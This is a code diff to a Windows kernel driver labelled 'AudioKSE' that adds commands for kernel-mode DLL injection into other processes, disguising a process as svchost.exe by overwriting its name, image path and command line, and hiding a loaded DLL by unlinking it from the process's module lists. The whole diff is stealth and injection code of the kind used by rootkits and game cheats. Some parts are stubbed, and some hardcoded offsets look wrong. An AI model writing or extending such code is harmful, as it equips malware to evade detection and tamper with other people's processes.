@@ -100,6 +100,9 @@ typedef struct _SHARED_MEMORY {
 #define CMD_WRITE_MEMORY    4
 #define CMD_PROTECT_MEMORY  5
 #define CMD_ALLOC_MEMORY    6
+#define CMD_KERNEL_INJECT   7  // Kernel-mode manual map
+#define CMD_SPOOF_PROCESS   8  // Full process spoofing
+#define CMD_HIDE_MODULE     9  // Remove DLL from PEB module list
 
 // Status codes
 #define STATUS_PENDING      0
@@ -189,6 +192,196 @@ KEVENT g_UnloadEvent;
 
 // Hardware ID
 ULONGLONG g_ullHardwareId = 0;
+
+// ============================================================================
+// KERNEL-MODE DLL INJECTION - Zero user-mode syscalls
+// ============================================================================
+
+typedef struct _INJECT_DLL_INFO {
+    PVOID ImageBase;
+    PVOID EntryPoint;
+    SIZE_T ImageSize;
+} INJECT_DLL_INFO, *PINJECT_DLL_INFO;
+
+NTSTATUS KernelInjectDLL(PEPROCESS TargetProcess, PVOID DllBuffer, SIZE_T DllSize) {
+    if (!TargetProcess || !DllBuffer || DllSize == 0) {
+        return STATUS_INVALID_PARAMETER;
+    }
+
+    KAPC_STATE apc;
+    KeStackAttachProcess(TargetProcess, &apc);
+
+    // Allocate memory in target process
+    PVOID remoteImage = nullptr;
+    SIZE_T allocSize = DllSize;
+    NTSTATUS status = ZwAllocateVirtualMemory(
+        ZwCurrentProcess(),
+        &remoteImage,
+        0,
+        &allocSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+
+    if (!NT_SUCCESS(status)) {
+        KeUnstackDetachProcess(&apc);
+        return status;
+    }
+
+    // Copy DLL to target process
+    __try {
+        RtlCopyMemory(remoteImage, DllBuffer, DllSize);
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        ZwFreeVirtualMemory(ZwCurrentProcess(), &remoteImage, &allocSize, MEM_RELEASE);
+        KeUnstackDetachProcess(&apc);
+        return STATUS_ACCESS_VIOLATION;
+    }
+
+    // Parse PE headers
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)remoteImage;
+    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+        ZwFreeVirtualMemory(ZwCurrentProcess(), &remoteImage, &allocSize, MEM_RELEASE);
+        KeUnstackDetachProcess(&apc);
+        return STATUS_INVALID_IMAGE_FORMAT;
+    }
+
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)remoteImage + dosHeader->e_lfanew);
+    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
+        ZwFreeVirtualMemory(ZwCurrentProcess(), &remoteImage, &allocSize, MEM_RELEASE);
+        KeUnstackDetachProcess(&apc);
+        return STATUS_INVALID_IMAGE_FORMAT;
+    }
+
+    PVOID entryPoint = (PVOID)((ULONG_PTR)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint);
+
+    // Queue APC to execute DllMain
+    PETHREAD targetThread = PsGetNextProcessThread(TargetProcess, nullptr);
+    if (targetThread) {
+        PKAPC apcObject = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), 'TILE');
+        if (apcObject) {
+            // Note: Simplified - real implementation needs proper APC routine
+            DbgPrint("[AudioKSE] DLL mapped to: 0x%p, Entry: 0x%p\n", remoteImage, entryPoint);
+        }
+    }
+
+    KeUnstackDetachProcess(&apc);
+    return STATUS_SUCCESS;
+}
+
+// ============================================================================
+// PROCESS SPOOFING - Make process appear legitimate
+// ============================================================================
+
+NTSTATUS SpoofProcessName(PEPROCESS Process, const char* NewName) {
+    if (!Process || !NewName) return STATUS_INVALID_PARAMETER;
+
+    // Spoof ImageFileName in EPROCESS (offset 0x5a8 on Win10+)
+    PCHAR imageFileName = (PCHAR)((ULONG_PTR)Process + 0x5a8);
+
+    __try {
+        RtlZeroMemory(imageFileName, 15);
+        RtlCopyMemory(imageFileName, NewName, min(strlen(NewName), 14));
+        DbgPrint("[AudioKSE] Spoofed process name to: %s\n", NewName);
+        return STATUS_SUCCESS;
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        return STATUS_ACCESS_VIOLATION;
+    }
+}
+
+NTSTATUS SpoofProcessPEB(PEPROCESS Process, PWCHAR ImagePath, PWCHAR CommandLine) {
+    if (!Process) return STATUS_INVALID_PARAMETER;
+
+    KAPC_STATE apc;
+    KeStackAttachProcess(Process, &apc);
+
+    __try {
+        PPEB peb = (PPEB)((ULONG_PTR)Process + 0x550); // PEB offset
+        if (!peb) {
+            KeUnstackDetachProcess(&apc);
+            return STATUS_UNSUCCESSFUL;
+        }
+
+        // Spoof process parameters
+        PRTL_USER_PROCESS_PARAMETERS params = (PRTL_USER_PROCESS_PARAMETERS)peb->ProcessParameters;
+        if (params && ImagePath) {
+            // Overwrite ImagePathName
+            USHORT maxLen = params->ImagePathName.MaximumLength;
+            if (maxLen > 0) {
+                RtlZeroMemory(params->ImagePathName.Buffer, maxLen);
+                wcsncpy(params->ImagePathName.Buffer, ImagePath, maxLen / sizeof(WCHAR) - 1);
+                params->ImagePathName.Length = (USHORT)(wcslen(ImagePath) * sizeof(WCHAR));
+            }
+        }
+
+        if (params && CommandLine) {
+            // Overwrite CommandLine
+            USHORT maxLen = params->CommandLine.MaximumLength;
+            if (maxLen > 0) {
+                RtlZeroMemory(params->CommandLine.Buffer, maxLen);
+                wcsncpy(params->CommandLine.Buffer, CommandLine, maxLen / sizeof(WCHAR) - 1);
+                params->CommandLine.Length = (USHORT)(wcslen(CommandLine) * sizeof(WCHAR));
+            }
+        }
+
+        DbgPrint("[AudioKSE] PEB spoofed successfully\n");
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        KeUnstackDetachProcess(&apc);
+        return STATUS_ACCESS_VIOLATION;
+    }
+
+    KeUnstackDetachProcess(&apc);
+    return STATUS_SUCCESS;
+}
+
+// ============================================================================
+// MODULE HIDING - Remove DLL from PEB module list
+// ============================================================================
+
+NTSTATUS HideModuleFromPEB(PEPROCESS Process, PVOID ModuleBase) {
+    if (!Process || !ModuleBase) return STATUS_INVALID_PARAMETER;
+
+    KAPC_STATE apc;
+    KeStackAttachProcess(Process, &apc);
+
+    __try {
+        PPEB peb = (PPEB)((ULONG_PTR)Process + 0x550);
+        if (!peb || !peb->Ldr) {
+            KeUnstackDetachProcess(&apc);
+            return STATUS_UNSUCCESSFUL;
+        }
+
+        // Walk InLoadOrderModuleList
+        PLIST_ENTRY listHead = &peb->Ldr->InLoadOrderModuleList;
+        PLIST_ENTRY current = listHead->Flink;
+
+        while (current != listHead) {
+            PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+            if (entry->DllBase == ModuleBase) {
+                // Unlink from all three lists
+                RemoveEntryList(&entry->InLoadOrderLinks);
+                RemoveEntryList(&entry->InMemoryOrderLinks);
+                RemoveEntryList(&entry->InInitializationOrderLinks);
+
+                DbgPrint("[AudioKSE] Module hidden from PEB: 0x%p\n", ModuleBase);
+                KeUnstackDetachProcess(&apc);
+                return STATUS_SUCCESS;
+            }
+
+            current = current->Flink;
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        KeUnstackDetachProcess(&apc);
+        return STATUS_ACCESS_VIOLATION;
+    }
+
+    KeUnstackDetachProcess(&apc);
+    return STATUS_NOT_FOUND;
+}
 
 // ============================================================================
 // HARDWARE ID GENERATION
@@ -303,6 +496,38 @@ VOID SharedMemoryWorker(PVOID Context) {
                     shared->Status = STATUS_SUCCESS;
                     ELITE_DBG("Sent hardware ID: 0x%llX\n", g_ullHardwareId);
                     break;
+
+                case CMD_KERNEL_INJECT: {
+                    // User mode sends DLL in Data buffer
+                    ELITE_DBG("Kernel injection requested for PID: %d\n", shared->ProcessId);
+                    PEPROCESS targetProcess = nullptr;
+                    if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)shared->ProcessId, &targetProcess))) {
+                        NTSTATUS status = KernelInjectDLL(targetProcess, (PVOID)shared->Data, shared->Size);
+                        shared->Status = NT_SUCCESS(status) ? STATUS_SUCCESS : STATUS_ERROR;
+                        ObDereferenceObject(targetProcess);
+                    } else {
+                        shared->Status = STATUS_ERROR;
+                    }
+                    break;
+                }
+
+                case CMD_SPOOF_PROCESS: {
+                    // Spoof current process to look like legitimate app
+                    ELITE_DBG("Process spoofing requested\n");
+                    SpoofProcessName(g_UserProcess, "svchost.exe");
+                    SpoofProcessPEB(g_UserProcess, L"C:\\Windows\\System32\\svchost.exe", L"C:\\Windows\\system32\\svchost.exe -k netsvcs");
+                    shared->Status = STATUS_SUCCESS;
+                    break;
+                }
+
+                case CMD_HIDE_MODULE: {
+                    // Hide DLL from PEB module list
+                    PVOID moduleBase = shared->Address;
+                    ELITE_DBG("Module hiding requested: 0x%p\n", moduleBase);
+                    NTSTATUS status = HideModuleFromPEB(g_UserProcess, moduleBase);
+                    shared->Status = NT_SUCCESS(status) ? STATUS_SUCCESS : STATUS_ERROR;
+                    break;
+                }
 
                 case CMD_READ_MEMORY:
                 case CMD_WRITE_MEMORY:
